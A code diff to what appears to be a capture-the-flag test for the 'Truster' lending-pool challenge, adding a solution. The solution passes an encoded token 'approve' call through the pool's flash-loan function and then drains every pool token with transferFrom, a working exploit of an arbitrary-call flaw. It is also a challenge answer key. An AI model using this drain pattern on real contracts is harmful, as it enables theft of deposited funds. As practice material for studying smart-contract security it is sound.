@@ -22,7 +22,11 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // The `TrusterLenderPool` allows us to execute any function call in its context, which is a very dangerous thing to do.
+        // We can simply let the pool approve the player to spend all of its tokens.
+        const payload = token.interface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);
+        await pool.flashLoan(0, player.address, token.address, payload);
+        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
     });
 
     after(async function () {
